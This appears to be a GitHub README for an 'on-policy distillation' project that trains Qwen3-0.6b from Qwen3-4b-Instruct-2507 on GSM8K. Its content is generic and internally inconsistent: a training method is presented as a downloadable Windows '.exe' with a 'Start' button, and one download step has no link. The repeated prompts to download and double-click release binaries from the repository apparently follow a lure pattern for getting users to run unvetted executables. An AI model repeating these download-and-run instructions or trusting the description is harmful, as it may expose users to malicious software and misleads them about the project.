# 🖥️ onpolicydistillation - Enhance Your Model Training Experience

[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Smooth-humvee686/onpolicydistillation/releases)

## 📚 Overview

On-policy distillation (OPD) allows your models to learn in a more efficient way. This application enhances the Qwen3-0.6b model using Qwen3-4b-Instruct-2507 to improve its performance on the GSM8K dataset, which contains math problems. Unlike standard training methods, OPD enables the model to learn from its own outputs, improving accuracy and reducing errors during inference.

### 🌟 Key Features

- **Improved Learning Experience**: The model benefits from its own generated outputs.
- **Compatibility**: Works well with A100 GPUs (40 GB RAM) or more.
- **Flexible Configuration**: You can adjust parameters to run on smaller GPUs.
- **Inspiration from Leading Research**: Built on ideas from top experts in machine learning.

## 🚀 Getting Started

To start using on-policy distillation, please follow these simple steps:

### 🛠️ System Requirements

- A computer with an A100 GPU (40 GB RAM) or a similar high-performance graphics card.
- Minimum of 16 GB of RAM recommended for smoother performance.
- A stable internet connection to download the software.

### 📥 Download & Install

To download the software, visit this page:

This page contains the latest version of the application for you to download and run.

### 📂 Installation Steps

1. **Visit the Releases Page**:
   Go to the [Download onpolicydistillation Releases](https://github.com/Smooth-humvee686/onpolicydistillation/releases) to find the version that works best for you.

2. **Download the Latest Release**:
   Click on the version link, and then choose the appropriate file for your system. The file will typically end in `.exe` for Windows, `.zip` for cross-platform, or similar formats.

3. **Install the Application**:
   - For Windows, double-click the downloaded executable file and follow the installation prompts.
   - For other systems, extract the file and follow any installation instructions provided in the README or documentation.

4. **Configure Your Environment**:
   Ensure you have the necessary libraries and frameworks installed. This typically includes:
   - Python (version 3.7 or higher recommended).
   - Required machine learning packages (like TensorFlow and PyTorch).
   
5. **Adjust GPU Settings**:
   If you're using a smaller GPU, consider changing parameters such as `samples_per_prompt` and `max_new_tokens` in the configuration file. This adjustment helps manage the workload on less powerful hardware.

6. **Launch the Application**:
   After installation, find the executable in your file directory and double-click to run it. Follow any on-screen instructions for model training.

## 📊 Using the Application

Once the application is running, you can begin training your model. Follow these steps for optimal use:

1. **Load Your Dataset**:
   Specify the GSM8K dataset to give your model the required math problems.

2. **Choose Your Model Versions**:
   Select the models Qwen3-0.6b and Qwen3-4b-Instruct-2507 from the options provided in the application.

3. **Start Training**:
   Click the "Start" button. The application will begin the on-policy distillation process.

4. **Monitor Training Progress**:
   Keep an eye on the output logs to ensure that the training is progressing smoothly. Address any errors as needed.
